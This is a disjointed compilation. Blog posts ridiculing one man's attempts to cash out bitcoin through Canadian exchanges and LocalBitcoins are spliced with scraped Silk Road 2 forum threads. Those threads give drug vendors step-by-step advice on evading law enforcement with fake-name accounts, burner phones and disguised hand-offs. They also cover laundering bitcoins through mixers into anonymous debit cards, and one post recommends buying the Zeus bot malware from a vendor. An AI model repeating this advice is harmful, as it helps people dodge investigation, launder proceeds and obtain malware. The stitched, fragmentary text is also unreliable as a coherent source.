Meanwhile, CaVirtEx is very very far behind in their, well, everything:  Total number of verifications outstanding: 1460 Date range we are working on: Nov 23 to Nov 27 Number of staff working: 12 fulltime, 6 part-time Verifications completed today: 81 Verifications missing info and put into waiting: 92 Outbound Phone Verification calls made: 155 Customer service tickets outstanding: 1,190  The next day, they finally get a response.  Virtex responded to my friends ticket and asked him to resubmit his âcorrect verification informationâ. Then outlined vaguely what he needed to submit (which he already submitted), and told him to resubmit.  So another week+ to get verification attempt #2?  When my friend gets fully verified and we dump several hundred coins onto the site, what is going to happen?  The consensus here was âtheyâll suspend the account for suspicious activity.â  Still trying, i am guessing the massive drop in price caused 3 of the localbitcoin buyers we were supposed to meet today to cancel.  emot-smith  The entire trying to cashout has been a massive pain in the ass. Virtex declined my friends identity verification, so i registered my self and i am going through the same process as well in the hopes Virtex will unfuck themselves. The entire system is shit. The longer and longer we are forced to wait the less and less likely it seems we will get a ton of money.  Two days later, they finally receive some âgoodâ news.  So my friend gets an email that he is verified at CaVirtex.  Even though they say unlimited withdrawl limit, his user page says a maximum of 6,000$/month withdrawal.  Unless he gets their bitcoin debit card, at which point he can directly convert his BTC to cash through the card. But neither me or him could find anyone actually using the card online and giving their impressions. So he has ordered one, as a means of hopefully expediting the cashout process.  So he submitted a request to withdraw $6,000, from Virtex and we shall see how that goes. 3-5 Days for a money transfer.  The amount of times i have seen bitcoiners say âYou can instantly convert BTC to cashâ, is such bullshit.  Three days later, everyone who predicted âsuspended for suspicious activityâ wins! They donât really win anything, except maybe for some laughs.  What the fuck is wrong with Virtex. Firstly they advertise Unlimited amount Withdrawls if you fully verify with them. When it is actually has a hard limit of 25,000$/month (after calling them and asking).  Then this afternoon they froze my friends account and cancelled the request for withdrawl, and cancelled his sell orders due to âsuspicious activityâ. We call them get some lady who tells us to submit a ticket, and very bluntly tells us the only way they can help us is through the ticket system.  Yet we already have two tickets open and unanswered from last week.  CaVirtEx is less than helpful here.  3 Days now and no response from virtex about the locked account, i guess i wonât hear anything until Monday at the earliest.  Which is fucking retarded.  Dogecoin happened in the meantime and, despite being a joke, has turned into Bitcoin in fast-forward, which itself was just centuries of economics lessons in fast-forward. Nobody has learned anything from it though.  It has basically been a week now, and his account is still frozen, and i am still waiting on verification.  Also apparently they are not allowing wire transfers for now?  quote: Dec. 17, 2013, 8:43 p.m. â Debit Card Loads and Wire Transfer Update  The Debit card load procedure is temporarily on hold, we will keep you updated as development occurs. For now, we will decline all your load requests so that the CAD is returned to your balance. Wire Transfers are scheduled to resume shortly, please wait for an official date before attempting to notify or send.  What the fuck is going on at virtex.  Nearly a week later, this is the last weâve heard thus far:  Virtex has unlocked my friends account, yay!  Also Virtex has recently added something called âLarge withdrawalsâ which apparently allow you to take out 25k+. Except there doesnât seem anyway to use this method of withdrawl.  He just requested a withdrawal which takes between 3-5 days, and i shall see if we get anything by 2014.  Happy Boxing Day! Letâs see if anything happens at all or if this story ends with yet another theft/loss. Oh, by the way, itâs probably a bad idea to use LocalBitcoins.  http://buttcoin.org/easy-like-sunday-morning    Equally disasterous is the first article from which the above was a follow-up:  Itâs So Easy  As the price of Bitcoin trundles to new heights, more and more people are looking to cash in their Beenz and run like Hell before exchanges vanish or are âhacked,â and are finding it to be a rather daunting task. With the popular Magic: the Gathering Online eXchange taking almost two years to allow withdrawals, Bitcoiners are turning to smaller exchanges that are ill-prepared to handle the volume, small-potatoes ATMs, or shady parking lot deals made through LocalBitcoins.  Weâre here today to detail the story of a man in Canada who happened to mine some Bitcoins back when CPU mining was possible, then forgot about them until the hype started to bubble the price unsustainably. This adventure is proving to be a little more difficult than expected. Here is his story so far, as outlined by SA Forums goon UberJumper:  I just learned my coworker has bitcoins from 2010. He apparently has spent most of the week trying to figure out how to convert them into USD. Mt Gox apparently wants an insane amount of personal information and even then he has to be added to a waiting list to even get any money out, and even then there is apparently some stupid low limit. But he sold some through Mt Gox, and estimates ~3 months before he can get any money out of it.  Trying to sell the coins in person, and basically saying he ether wants Cash, or a Cashiers check (since it can be handed over right then and there), has apparently been a hilarious clusterfuck.  Today he met some guy infront of his bank, and apparently as soon as he mentioned that he needs to get the cash checked to make sure it is not counterfeit, the guy freaked out and basically walked away. Stuff like this has been happening all week, and he apparently so far has only sold a single coin of several hundred.  Even more hilarious, there is apparently a place here that will buy your bitcoins from you. According to him on their site, they offer prices that are less than Mt Gox, so he tried to go in to sell them. Only to be told they will only offer 150$/coin.  Bitcoin is the currency of the future right guys?  The consensus here was âtake the money and run.â Not so fast!  I would do that as well, however according to him they donât give you the money on the spot they take the coins and then send you the funds through a wire transfer. Which means no ESCROW, given how scammy bitcoin is i think he choose the better idea.  Also apparently almost all of Gyftâs Gift Cards are not valid outside of the united states. emot-wtc  Heâs already got funds in MTGOX, but it, of course, has problems.  Apparently he already has a 6 digit sum sitting on Mt Gox, and he is fine with giving them his personal information, which apparently can take a couple of weeks to get verified.  emot-wtc  He is apparently scared of leaving a large amount of money on some of the other exchanges mostly because he is worried of âWhat if it disappears?â. He is fine with giving them his personal information, and he is willing to pay taxes/do paper work. He just wants his filthy real money.  Iâll let him know about bitstamp, he is Canadian though, the entire process so far from what i can tell has been a massive headache. I do know tonight he is apparently meeting someone who is willing to give him 500$/coin, so i have a feeling he will end up lying in a ditch somewhere.  This leads to their first experience with LocalBitcoins:  I just got back from accompanying my friend, to meet someone who wants to buy bitcoins. So we go to Starbucks, and wait for this guy who is apparently willing to pay 500$/coin, and wants 50 coins. The buyer shows up, wearing a decent suit, buys me and my friend coffee (with filthy fiat of course), and starts talking about how he buys local bitcoins and puts them on the major exchanges (I asked him if he considered himself a Captain of Industry, and got a weird look emot-smith).  Everything was going well, until the buyer tried to write my co-worker a check. Not a cashiers check, just a plain old check that will bounce if there isnât enough money emot-wtc. Which according to him is apparently as âgood as a cashiers checkâ. He didnât want to use an ESCROW service, and his âfeedback on localbitcoins.something is all we needed to see that he is legitâ. Because you know an exchange valued at 25,000$ obviously you can just trust the guys feedback. We left pretty fast.  My coworker is going to try to use bitstamp and see if he can get his money out.  *EDIT* I just realized how completely and utterly stupid this is. Who the fuck does an exchange valued at 25,000$ in a Starbucks? Shouldnât something like this be done with Lawyers, or Accountants present? Some sort of professional service to handle exchanges like this?  Obviously this wasnât kosher, but they were willing to give it another try.  I am supposed to go with my friend soon to meet another Captain of Industry, to try and sell 25 butts at 300$/coin. He is apparently paying cash, and has agreed to meet us at a bank, and has agreed to have the cash verified as legit.  Bitcoin is supposed to be worth 800+ according to mt gox, yet getting someone to pay even half of that value in real life is apparently too difficult.  While we waited for an update, our beleaguered heroes were informed of the ease of cashing out via Coinbase:  Guys getting money out of bitcoin is super fucking easy, according to a goon who PMâed me said i should use coinbase, and can just drive to the US and open an account. The steps involved from what i can tell are:  1. Drive to the US 2. Open a bank account with a bank there 3. Drive home 4. Sign up for Coinbase, give them all your personal information, and wait until your verified. 5. One of the verification steps is:  Complete A Purchase â Buy some bitcoin and wait at least 30 days  emot-allears  6. Ignore all these coinbase horror stories of that are on reddit right now. 6. Sell your coins 7. Since coinbase has no fees* they will take 1% of your money if you try to cash out. 8. Have the US Bank wire it to your other account (who knows what kind of fee it is!)  CURRENCY OF THE FUTURE  Success!  My friend managed to sell 5 of his butts at 400$/butt! So he bought everyone in our group lunch emot-unsmith.  Also apparently when you fail coinbaseâs identity verification it locks you out for 24 hours. emot-allears  Someone wasnât paying attention and suggested LocalBitcoins.  What my friend told me is that a large number of people on localbitcoins, wanted him to use something like paypal, or moneypak codes. Then kindly asking people who want to pay cash to meet at a bank, to verify the cash is not counterfeit, also apparently causes a lot of people to nope right the fuck out of there.  He canât use gyft and cash out through giftcards because unfortunately the vast majority of the giftcards do not work in Canada.  He sold some on mt gox, and he is apparently in some cashout queue, with no real indication of how long until he can take his money out. Coinbase doesnât let you use non american accounts to cash out. He is currently trying to get verified on VirtEx.  âTrust me.â  My friend and I went and contacted a buyer on localbitcoins, and met with him at lunch. The buyer was offering 600$/coin in cash according to the listing, and was willing to buy up to 25 coins.  My friend showed up, the buyer instead insisted on paying the entire amount in Amazon giftcards (50 bucks a card, and had a small plastic shopping bag just filled with gift cards).  I asked him how do we know the gift cards are activated? âTrust meâ.  Nope.  The score so far?  He has cashed out (as in he has money in his possession and can use it) of 11 bitcoins so far i think (this is over 2 weeks). He sold 30 odd coins on Mt Gox, and is trying to cash out (he is in some sort of retarded queue and apparently there is a limit of how much money you can take out per withdrawal).  My friend is still trying to get Virtex to do anything. He filled in information and sent them all the information required, and is basically waiting for them to consider him verified. They also have a 3.0% fee on selling apparently.  emot-v  Also apparently they charge you a 50$/month if you do not do anything with coins/cash on their system.  ARTICLE 13 â DORMANT ACCOUNTS 13.1 If you have not executed a trade with your VirtEx account for more than 1 year your account will be considered inactive. VirtEx will charge an inactivity fee of $50 per month up until such a time when the account balance reaches zero. BTC balances will be converted to CAD to pay for this fee, as required.  And finally:  Well this is an improvement:  Hello,  I am interested in purchasing Bitcoins and i am willing to pay $500.00 per BTC. Payment would be provided in the form of bullion gold bars of equivalent value.  Would this be a suitable exchange rate for you?  emot-wtc  What the Christ indeed. For anyone left paying attention, cashing out in any appreciable way is a disaster, and you wonât get anything close to the âvalueâ quoted on the various exchanges, which isnât terribly surprising given that they seem to be subject to manipulation and in no way represent what people are actually receiving for their pogs. If UberJumper and his Bitcoin millionaire pal manage to get anything more out of the system, weâll let you know.  http://buttcoin.org/easy",""

He eventually logged in and posted the following message to us:   I would normally not ever divulge anything from our hidden forums but seeing as I feel this was our final order given by our leader we felt obligated to alert the community with something more than just our words.  As you can see that message was clear that if he was not online for 24 hours he should be considered compromised and it has been over 36 hours now since he last logged on.  We tried asking Defcon about this but he never responded to us other than a similar message like he posted in the discussion forum that DPR was okay, but we as staff, have no way to verify that.  Let me be clear this is not to sabotage DPR, or Silk Road - on the contrary it is to remain loyal the final signed order we received from our Captain.  Seeing as he directly told us in this message to even ignore any future signed messages if that 24 hour period elapses we felt there was no other course than to follow orders and consider his account compromised.    I suggest removing any and all bitcoins you have in the market and to consider the website under the control of LE.  Considering all that has happened lately, we (myself and ChemCat) felt this was our only course of action and we didn't come to this decision lightly.  I think for now our journey on Silk Road has ended - but there will be others and we did so many marvelous things.    Please spread this message everywhere and share with as many people as possible.

Until the time I know any different or more evidence comes to light remember to think back and if there is anything that may further compromise anyone he may have had access to let me know.Libertas's case is not supported by much other than rumors. As such it is unlikely this applies to him and it may be a case of bad luck he hasn't logged on for some hours but continue to also treat him as hostile.Right now I myself have no reason to be offline for any period greater than 24 hours, especially now I am aware of the events above.

Example: Your hotmail email is the same as your SR username and it has your full name on it the outlook profile info.  Don't use your bank account to buy BTC, it's a big give away if you are under investigation.  And handling of large amounts of product/packaging that your fingerprint may be left on I'd recommend wearing gloves  Use Paypal, and sign up for it under a fake name. (You just need a working cell number)  Speaking of Cell Phone's; DO NOT use text messages to communicate any of your dealings/movements (on your personal cell) Edward Snowden taught us it's a bad idea.  Depending on how big your operation is I'd take a small page from my book when it comes to safety.  Fake name EVERYTHING (whats possible at least). Paypal. Outlook. Virwox (what I use to buy BTC)  Buy a prepaid cell phone if you need to be in communication alot, and by all means use text messaging over phone calls. If you do need to speak over the phone i'd throw my voice as much as possible just in case you're already under investigation and being recorded.  Build up a very strong base of SMART associates you can trust so you don't get in trouble with an undercover agent.  And when making big deals do it in public.  Example, meet at a coffee shop, your friend is buying 100x pills of whatever. wrap it in wrapping paper and tape it under the table out of view before your associate ever gets there (in case you are being set up/watched) Very calmly tell them to give you the money across the table after doing so whisper in their ear the location of the package and walk away.  Obviously this scenario will only work with people you trust/trust you.  Make it look like you aren't doing what you're doing. I don't care how much money you are pulling in weekly you need to have a day job/ go to school. It's so much easier for someone to be under investigation be looked at further if they live on their own, sleeps till noon, has a nice car they paid in cash for, and constantly leaves the house at all hours of the night.  NOW MOST IMPORTANT OF ALL ENDGAME SENARIOS.... CLAIM IGNORANCE AT ALL TIMES WHEN POSSIBLE AND KEEP YOUR MOUTH SHUT.  ""I have no idea who attempted to send me this package, you can send anyone anything in the mail to be fair""  ""Under the advise of my lawyer and other legal council I hereby invoke my 5th amendment rights against making any statements which might incriminate me ""   To and someone reading this is seems like a lot of paranoid precautions but to me when time in jail is involved I say you can NEVER be TOO safe.

"Silk Road 2 Forums","throwaway8","19898","2014-03-17T23:09:18","QUICK AND EASY TIPS TO STAY SAFE FROM LE","Discussion/Legal"," I read an article recently describing how LE filters out cell phone traffic and looks specifically for burners (i.e. tracphones), I'll try to find it and post it. If you're in a small town/city, it may be somewhat easy to track you. Burners are probably still the way to go, but they aren't as fool proof as a lot of people think. Let's be frank here, people can buy an older generation iphone for around $20, LE knows damn well what tracphones are used for nowdays.   My advice:  - Never text with a burner, they're much easier to moniter than talking. (no shit) - Never say anything even mildly incriminating. - Never say your name, or your associates' name. Or anything identifying, for that matter. - Never use a burner for more than a month, preferably less. You get any bad vibes, just toss the phone. - Never activate a burner from your personal computer. Create a USB Virtual Machine and run: Tor, Tails, Shredder, and BCWipe. If you can help it, use a computer from a cheap public library, or where you have access to a computer with owners who aren't tec savvy (maybe an internet cafe). Every few months, simply smash the USB and create a new one. - If something doesn't feel right, it's probably because it's not. - Your freedom/life and safety are not worth a business, get the hell out if something went wrong. Leave your state like I did. It takes about 1 year to build a solid case, if you leave their jurisdiction chances are the investigators will have to move on.

"Silk Road 2 Forums","crazzeyhorse","19898","2014-03-18T12:41:13","QUICK AND EASY TIPS TO STAY SAFE FROM LE","Discussion/Legal","I read that the burner phones use CDMA or something like that? They are very easy to track for LE. Anyway all records for those type phones are kept in a separate ""file"" if you will than the phones like new androids and apple.  CDMA burner phones are kept in a separate file exactly because they are used for nefarious reasons. And buying a new burner phone doesn't exactly work because they keep a log of contacts. If you are A and you call B and C you are set of contacts. If you change your burner phone but your location(cell tower triangulation), call times etc. are the same as A was, the phone you threw in the garbage, you are assumed to still be A. And the same for B and C when they toss thier phones. The only way around that is to use the new type phones to keep you off the radar. I personally feel safer talking on the phone than texting. Text messages can be subpeoned. Text messages are kept forever although you'll play hell trying to ever get a copy of your own messages. And if you get comfortable using texts and your friends you deal with are comfortable using texts you can be trapped by a cop texting you when your good-never let you down-homey turns on you. I believe it should be understood between people text messages NEVER are for deals, ever.  Personally I never arrainge deals or buy or sell anything unless its face to face. It is never so urgent that I cant drive to a persons house to talk with them. And if people cant abide by that rule maybe they are not good company. I drove an hour once just to hear, ""wish you would have asked me before you came"", ""I thought you had something cool to show me"". But not a soul knew what I was doing.  Wanted to throw in one other thing. If you are selling something and just as you agree to sell something to the person they say, ""actually I'm not the person with the money. Its my friend here and he wont buy unless he deals with you directly"" Had a freind do a few years after hearing those sweet words of Judas. The ""friend"" was cop.  The original guy who was the rat spent some time of his own in the hospital. Mexicans can be very vicious opponents. That all was about 35 years ago.

Like 6 hours ago I logged in on my computer and SR2 account as normal. What happened was that popups started appearing on my computer screen, warnings, threats, a picture from somewhere in my files with my name on it. One message contained all my info from SR2, account name and password, and worst of all my real address and order info! I moved around in SR the pop-ups were describing my activity like ""we are watching you dont alert the SR2 mods"".  The popups kept coming and threatening me to sumbit bitcoins to some account or they will tell the local police about my dealings. So there was a trojan on my computer that had gathered all this personal and secret info. I formatted my whole hard drive instantly and installed Windows again. I came here, changed my PWs, added PGP check to my account and added my public key to my profile info.  The next question is, what the hell should I do? Are these random threats or can these attackers actually do something like notify my local police? Am I in danger personally now that some evil people have my name and address? Please tell me your opinions and has this kind of thing happened to anybody?  And yes I was careless and stupid, but dont know how the trojan got through.

"Silk Road 2 Forums","Nightcrawler","13900","2014-01-04T06:08:38","Need guidance fast! Trojan attack on computer and account hacked!?","Discussion/Security"," No disagreement with you at all.  You simply cannot depend on anti-virus/anti-malware software for protection. The only  real protection you will ever have is to have a security-oriented mindset. Other people picked up on the fact that it was suspicious as hell to receive a message purporting to be from a moderator, advising one to download software from a dodgy website. The ones who queried this, the ones who posted asking questions about this, and raising the alarm, didn't get pwned.   User gullibility is the single biggest security hole of all. It literally doesn't matter what else you do, you can't fix stupid.   Even RSA Laboratories got bit by this. One stupid, brain-dead secretary, fished an alleged .pdf document out of the spam folder, where it had been placed by  the company's spam filters. The document was labeled, ""Corporate Personnel Forecast 2014"" or something along those lines. She opened the document, and her computer got infected.  Her computer became the backdoor through which the hackers gained access to RSA's network. It didn't get too long before they got to RSA's Crown Jewels -- the seed files for the RSA security keyfobs.    These keyfobs had been sold to companies, including a fair number of defense contractors. These fobs provided two-factor authentication, preventing anyone without the fob from logging into the corporate networks of RSA's customers. The problem was, that once these hackers got their mitts on the seed files, they could duplicate the output of the fobs, rendering them worthless.  RSA had to replace authentication servers, and thousands of these fobs, at a cost of over $100 million -- all because of one brain-dead idiot who went ahead and clicked on something that they shouldn't have. Employees have been warned against such behavior for more than two decades now. Like I said, you can't fix stupid.

What happened was thatpopups started appearing on my computer screen, warnings, threats, a picture from somewhere in myfiles with my name on it. One message contained all my info from SR2, account name and password, andworst of all my real address and order info! I moved around in SR the pop-ups were describing my activitylike ""we are watching you dont alert the SR2 mods"".The popups kept coming and threatening me to sumbit bitcoins to some account or they will tell the localpolice about my dealings. So there was a trojan on my computer that had gathered all this personal andsecret info. I formatted my whole hard drive instantly and installed Windows again. I came here, changedmy PWs, added PGP check to my account and added my public key to my profile info.The next question is, what the hell should I do? Are these random threats or can these attackers actually dosomething like notify my local police? Am I in danger personally now that some evil people have my name and address? Please tell me your opinions and has this kind of thing happened to anybody?And yes I was careless and stupid, but dont know how the trojan got through.

Trojan attack on computer and account hacked!?","Discussion/Security"," I recently saw a very interesting whitepaper about malware breaking out of a virtual machine by exploiting the level 1 CPU cache.  I believe that was it, anyway.  Hopefully this particular programmer wasn't as skilled as a university researcher, but hey, you never know -- maybe he saw the paper too, heh.  I'm particularly interested in how he contacts the infected machine.  Unless he implemented a stripped down version of the Tor hidden service protocol, the virus would have to include most of the Tor program itself.  Either that or it would simply have to wait until Tor is running and then modify its settings to set up a hidden service with a known onion URL, but that would require a unique address for every victim.  That's a messy wrinkle that severely limits effectiveness.  I'm really not sure how he hopes to stay hidden, is my point: if the infected machine reaches out to an IP, he can be traced starting there.  If he initiates the connection, firewalls are going to defeat it and he'd still have to report the infected IP somehow to know where he's connecting to his victim in the first place.  I'm very curious how he handled it  ","Quote from: Burning Babylon on January 04, 2014, 02:38:05 pmQuote from: kr-rypt on January 04, 2014, 02:29:56 pmQuote from: Eduardo on January 04, 2014, 02:19:53 pmGo to Flomarket site.  Talk to the vendor selling the Zeus bot program.  He will likely help you for a few btc's.Dude's legit.  Do not deposit bitcoin on FlomarketMadmaxUK? well anyway I dont have the btc  oh well I'll keep playing with it and post a screenshot later of tht website [with no doxxing info I like my account thank you]Quote from: tankfly on January 04, 2014, 02:24:30 pmQuote from: kr-rypt on January 04, 2014, 02:15:49 pm**UPDATE**I downloaded the malware into a hardened virtual machine and have been playing around with it I noticed on etherape there was a very strange IP address SO I opened it in my browser and found a very very odd website I also have had no luck in reverse engineering it but I'm going to submit it to symnatecs virus lab or mcavee or someone later on so it will show up in virus definitions in the future,Dude, you're awesome; you make up for the dicks here laughing and hooting.

"Silk Road 2 Forums","PerpetualTourist","18776","2014-01-21T01:13:04","PT Discussion: Nest egg and ""pass-through"" bank accounts","Discussion/Security","Many PTs use something called a ""pass-through"" account for buying groceries and paying rent/bills/utilities, et cetera.  I was wondering if this might be a good idea:  A modern-day PT would use a bitcoin wallet as his nest egg, and would place most of his wealth and monetary assets in that bitcoin wallet. All of the bitcoins should already be washed through Bitcoinfog.  If the PT needs to spend money for rent/bills/groceries/hotels, he would send a small percentage of the bitcoins from his nest egg to Bitcoinfog (to wash it again), and then he would send the bitcoins from Bitcoinfog to a happycoins.nl sell-address, which would convert the bitcoins into real-world currency deposited into his ""pass-through"" IBAN bank account (linked to the happycoins.nl sell-address). The PT can then use the anonymous debit card linked to that pass-through IBAN bank account to buy groceries, pay rent, pay utilities, or get a hotel room from time to time.  Ideally, the PT would use multiple anonymous debit cards linked to multiple IBAN bank accounts so that his endeavors are never financially limited, and no one can ever pinpoint his real identity.  And by having a bitcoin wallet as his nest egg, he won't have to rely on an offshore bank account that MAY or MAY NOT one day disappear and run off with all of his money (or, that MAY or MAY NOT one day be audited by an intergovernmental organization like Interpol or FATF - or even stand-alone governments like the USA, given enough political pressure).  And by backing up his nest egg bitcoin wallet on multiple TrueCrypt-encrypted flash drives, and hiding each respective flash drive in different locations around the world known only to him (such as in a ceiling tile in the restroom of a fast-food restaurant, or inside of a power outlet of a restroom of a 5-star hotel, or vacuum-sealed and water-proofed in a container under the ground in a forest somewhere), he would have complete and interminable control over his financial assets.  What are your thoughts, SR?",""
"Silk Road 2 Forums","Hiniguel","18776","2014-01-22T14:01:57","PT Discussion: Nest egg and ""pass-through"" bank accounts","Discussion/Security","So to sum it up, you basically mean:   This person has a large amount of Bitcoins but doesn't want to launder them as a whole. So, instead wants to horder the Bitcoins (in hope they increase in monetary value - or for ease of not having to launder) and will only cash out small amounts time to time to anonymous debit cards to pay for living means.    It could work, yes. Never pay a bill (or rent etc.. anything linked to your real identity) with these cards.   Instead withdraw the cash and try to pay it via cash. If you can't pay in cash, pay someone 'compensation for doing something illegal for you' to pay it for you and give them the cash. Try to make it a friend/relative if you are going to do it that way so if anyones ever asked, it just looks like a friend/relative paid a bill for you as you couldn't afford it.  If you are going to do this - live with the bare minimum. Sure maybe have nice clothes, get good food etc but don't get flashy or let people know you have a lot of cash as I'm assuming you will be unemployed? If not and you have a real life job, then you have an excuse for having the money to an extent.    Try to keep the anonymous cards or any sums of cash away from anything to do with your real identity. I.E Don't buy stuff online to your home address to your real identy with them, or pay a bill that is in your own name with one. If you do that , they are no longer anonymous. Try to avoid using the cards in stores as well, just withdraw the cash. Using the card in a store can put a face to a transaction on CCTV.",""

Drug use isn't about age, there's no instinct about how to use drugs that just 'clicks' when you reach a certain age. I've been doing hard drugs since I was like 15. I know plenty of older people that are ignorant about drugs, and plenty of youngsters who are responsible.   It varies by the individual. I love this place because people can ask questions about their drug of choice without being put down. This place should be about promoting safety, responsibility, and freedom.  Yes, drug use at a young can have certain physiological effects, but I know if I didn't have eat so much LSD in high school, I wouldn't have the wide perception I do now.

I guess why would we want to force kids to take the risk of buying on the street.    Not wanting kids to buy drugs is not a fallacious reason.   o I do agree with some of what you say in regards to harm reduction. However I started doing drugs around 14-15 too. It started with cigarettes and alcohol, then pot and vicodins, then acid MDMA and coke, then more and more opiates until finally I'm addicted to heroin. I'm educated and have a very good job and can afford my habit but there aren't many weeks go by that I don't wish I never started. Maybe if I didn't get involved until later in life I wouldn't be where I am. My therapist says that the reason I have an issue with addiction is that unlike most people growing up I never learned moderation. I'm not genetically predisposed to addiction, my family doesn't even have any alcoholics, and I don't have depression issues or anything like that. During the time my brain was still developing and I should have been learning about moderation I was out getting all kinds of fucked up.    There is a boat load of research out there that shows for a fact the drastic effects drugs have on young, undeveloped minds. It's not opinion, it can't be disputed, it's scientific fact.   But it's hard to argue against the idea that if kids don't have a place like this to find drugs if they want them they'll get them elsewhere. On the streets where it's much more dangerous. The only argument that one could make is that SR provides access that may not be available on the streets to everyone. That's one thing that slowed down my drug use progression as a kid.

I know plenty of older people that are ignorant about drugs, and plenty of youngsters who are responsible. It varies by the individual. I love this place because people can ask questions about their drug of choice without being put down. This place should be about promoting safety, responsibility, and freedom.

My definition of fallacious would be false or mistaken. It is not false that kids don't know what's good for them, a parents job is to teach that. A kid wanting drugs is proof they don't know what's good for them. As I said previously it is medical fact that drugs damage the still developing brain of teenagers. The elevated image of Silk Road alone might be a malicious reason to require age verification but would be a benefit of age verification due to making a choice to be responsible.   This is a totally theoretical discussion because there's most likely no f'n way it would be possible.    I still can't disagree with the harm reduction argument but I can't totally agree either. I don't really know for sure if younger people are using this site to score drugs that wouldn't be available to them on the street. I'm sure at some point we will see studies reflecting this. If the site is opening doors for teens to acquire drugs they wouldn't get elsewhere on a large scale then I personally could never argue against age verification if it were possible. ",""

On a social app that was made and released on a mobile OS, and the app market made us put it in the 17 or older and we had kids coming on and it caused a lot of problems and we had to immedialty revise terms and others to cover our ass.    However, we really tried to keep the children off because what was being said did not need to fall on their innocent ears. There were kids as young as 12 getting on the app!! What is worse, some adults tried to contact the kids---SICKENING.  It was a very tough battle for an app and i am sure some still sneek on, so for here could not even begin to think how to implement although i do see the need!!

I'll rephrase that pieces of elemental knowledge of tabacology for you to understand. I do not remember any numbers of that study, would be able to come up with sources though. Again it's basic knowledge so it will not be hard to come by.    if parents smoke, children have increased likelihood of smoking   if parents dont smoke, children have decreased likelihood of smoking This is an observed fact. It is a general valid statement and its corrolar that I added.  You insert here another variable, which is ""attitude towards tabagism of their kids"" and get: if parents don't smoke but tolerate it for their kids, they have the lowest likelihood of smoking if parents do smoke but tolerate it for their kids, they have low likelyhood of smoking  if parents do smoke but don't tolerate it for their kids, those have the highest likelhood of smoking   No. Why do you say that.  Yes, true  There is no contradiction here just your some fallaceous reasonning. Parents who smoke have more chances having smoking children. If those parents have a lenient attititude towards tabagism, than their children will have the lowest chances of being smokers So the majority of smoking children have smoking parents that forbid their tabagism  HENCE:  Attitude towards tabagism of the parents determines tabagism of children more than (social, insert debate here) reproduction   I think this appropriate for this topic, no?

","Quote from: JehovahsWitness on January 10, 2014, 12:04:25 pmQuote from: nick Cotton on January 10, 2014, 11:50:34 amnot being funny but the worst people to ask about what's best for children are parents. they don't think in logical terms, they just think about protecting their own child, which makes them heavily biased toward security and over protecting.You should add ""despite of knowing better"". It would have been an interesting thought to discuss. Whereas as you write it.. well you know what's best for your children, because they're your children. but that doesn't mean you know whats best for other peoples children, because they're not ...your children.but also as a parent you have to swallow that hard pill and accept that your children are also their own person, with their own thoughts, wants and desires. you can guide them and protect them through the early years but at some point they will take over that role for themselves. you have to accept and respect that. otherwise you are not respecting them as human beings, which is exactly the same as what the govt does to all of us when it preaches what it thinks is best for each and every one of us. this next part that you stated is seriously flawed. i dunno if you heard it from some ultra fear mongering propoganda work shop or just made it up yourself.QuoteAlso:if parents smoke, children have increased likelihood of smokingif parents don't smoke but tolerate it for their kids, they have the lowest likelihood of smokingif parents do smoke but tolerate it for their kids, they have low likelyhood of smokingif parents do smoke but don't tolerate it for their kids, those have the highest likelhood of smoking So does that at least help a little bit explaining what I mean by fallacious?the two lines in bold amount to exactly the same thing. in the first you said if parents smoke then children have increased likelihood of smoking themselves. in the second example the parents still smoke, but you're claiming this time that the kids have a low likelihood of smoking. but the parents still smoke, which totally contradicts the first.anyway this is all bullshit that is designed to deter your mind away from the fact that each and every one of us is an individual, a very capable and intelligent individual and we will all make our own decisions about what we do, and are able to take the consequences of our actions. this sort of thing gets everyone thinking that we are robots that can be programmed. human life is never going to be that black and white and there are way too many variables in any human life to be able to even make such ludicrous predictions anyway.;the two lines in bold amount to exactly the same thing. ;in the first you said if parents smoke then children have increased likelihood of smoking themselves. ;in the second example the parents still smoke, but you're claiming this time that the kids have a low likelihood of smoking. but the parents still smoke, which totally contradicts the first.;anyway this is all bullshit that is designed to deter your mind away from the fact that each and every one of us is an individual, a very capable and intelligent individual and we will all make our own decisions about what we do, and are able to take the consequences of our actions. this sort of thing gets everyone thinking that we are robots that can be programmed. human life is never going to be that black and white and there are way too many variables in any human life to be able to even make such ludicrous predictions anyway."

If you cannot figure out a safe and reliable way to cash out your coins, then you are never going to make it!If you wanted to operate 'on the books' you could setup a exchange account and have the exchange directly wire money to your personal bank account, but you would then need to show where the money came from if you are audited by the IRS. Since bitcoin is still grey area you can just say 'i mined them' and pay captial gains, though im not a advocate of paying taxes.There are polish debit cards that you can setup a international xfer from a exchange to the card/account, but they have low limits (3500 a year) so you would need to buy lots of them if you wanted to regularly cash out.Or you can just act like its the wild wild west and setup a localbitcoins account and sell them directly above market value. This is obviously dangerous.No matter what you do, be sure to tumble your coins. blockchain.info has a 'shared send' service that appears to technically be the most advanced tumbling and the cheapest too, at only half a percent fee.Good luck."

How should I set it up? Keep in mind that I am a vendor and would like optimal security.Unfortunately a netbook is too low end for virtual isolation. What does your box have, a dual-core Atom processor, 2 GB of RAM and a 1024x600 screen? That's not enough to run Qubes OS which is arguably the most secure desktop operating system that comes in a nice out of the box solution (properly configured OpenBSD might be more secure but requires advanced technical knowledge to setup).A better solution would be turn your netbook into an anonymizing middle box and put Linux on your main computer in a dual-boot configuration. I would first try to install Qubes OS and see if that works with your hardware. It uses full volume encryption by default and Xen for virtual isolation which is supposed to be the most secure. Then read through this guide on how to turn your netbook into an anonymizing middle box:https://www.whonix.org/wiki/Physical_Isolation#How_To_Install_Whonix-Gateway_on_Hardware_.28RECOMMENDED.29If Qubes OS doesn't work with your hardware for some reason, you can install a more recent distro and setup full encryption of the Linux partitions, then run Whonix workstation on top of that. Recommended host OSes: Xubuntu, Lubuntu or the similar Linux Mint variants with Xfce or MATE. Recommended workstation OSes: Lubuntu or Xubuntu.If you don't want physical isolation by converting your netbook into an anonymizing middle box or you can't get it setup for whatever reason, you can still use the default Whonix Gateway (on your Linux host OS) to securely torify the workstation VMs. To roll your own workstation, import the Whonix-Gateway, then create the Workstation VM and set the networking to internal. There will be one option, Whonix, so select that. During the installation DHCP autoconfiguration will fail because the Whonix Gateway doesn't have a dhcpd.

I can't comment on the rest of your question beyond this: generally speaking, dual-boot systems are for convenience.  They just let you choose what operating system you want to boot, that's all.  If you only use a machine for business, there's no reason you'd need that setup.","The wi-fi problem is handled by using a VPN though, isn't it?

